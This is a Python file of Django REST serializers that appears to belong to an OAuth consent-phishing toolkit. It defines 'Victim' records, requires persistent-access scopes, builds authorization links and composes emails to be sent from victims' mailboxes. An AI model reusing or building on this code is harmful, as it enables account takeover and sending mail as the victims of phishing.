import io
from base64 import b64encode
from rest_framework import serializers
from .models import Application, Victim
from .helper import get_authorization_url
from .objects import Attachment
from django.contrib.sites.models import Site
from urllib.parse import urlparse
import magic

class ApplicationSerializer(serializers.ModelSerializer):


    class Meta:
        model = Application
        fields = '__all__'

    def validate_scopes(self, value):
        scopes = value
        if not 'user.read' in scopes:
            raise serializers.ValidationError("Application scope must include user.read!")

        if not 'offline_access' in scopes:
            raise serializers.ValidationError("Application scope must include offline_access")

        return scopes

    def validate_redirect_url(self, value):
        current_site = Site.objects.get_current().domain
        redirect_url = value
        parsed_redirect_url = urlparse(redirect_url)
        if current_site != parsed_redirect_url.netloc:
            raise serializers.ValidationError("Oauth redirect_url must match the current site's domain")

        return redirect_url


    def to_representation(self, instance):
        ret = super().to_representation(instance)
        ret['authorization_url_full'] = get_authorization_url(instance)
        return ret




class VictimSerializer(serializers.ModelSerializer):
    class Meta:
        model = Victim
        fields = ['id','name', 'email']

class VictimDetailSerializer(serializers.ModelSerializer):
    class Meta:
        model = Victim
        fields = '__all__'

class RecipientSerializer(serializers.Serializer):
    emailAddress = serializers.DictField(required= False, child= serializers.CharField())


class AttachmentSerializer(serializers.Serializer):
    contentType = serializers.ReadOnlyField()
    isInline = serializers.ReadOnlyField(default= False)
    name= serializers.CharField()
    size = serializers.ReadOnlyField()
    contentBytes = serializers.ReadOnlyField(default = 'XXX')


    def to_internal_value(self, data):
        filebuff = b64encode(data['file'].read())
        size = data['file'].size
        contentType = magic.from_buffer(data['file'].read(1024))

        data = super().to_internal_value(data)
        data['contentType'] = contentType
        data['size'] = size
        data['contentBytes'] = filebuff
        return data




class MessageSerializer(serializers.Serializer):
    bccRecipients = serializers.ListField( required= False, child= RecipientSerializer() )
    body = serializers.DictField( required= True, child= serializers.CharField() )
    ccRecipients = serializers.ListField( required= False, child= RecipientSerializer() )
    replyTo = serializers.ListField( required= False, child= RecipientSerializer() )
    subject = serializers.CharField()
    toRecipients = serializers.ListField( required= False, child= RecipientSerializer() )
    # attachments = serializers.ListField( required= False, child= AttachmentSerializer() )
    hasAttachments = serializers.HiddenField(default= False)

    def validate(self, data):
        if 'toRecipients' not in data and 'bccRecipients' not in data and 'ccRecipients' not in data:
            raise serializers.ValidationError("You must send the message to someone!")

        if 'attachments' in data:
            data['hasAttachments'] = True

        return data

class MessageWrapperSerializer(serializers.Serializer):
    SaveToSentItems = serializers.BooleanField(default=False)
    Message = MessageSerializer()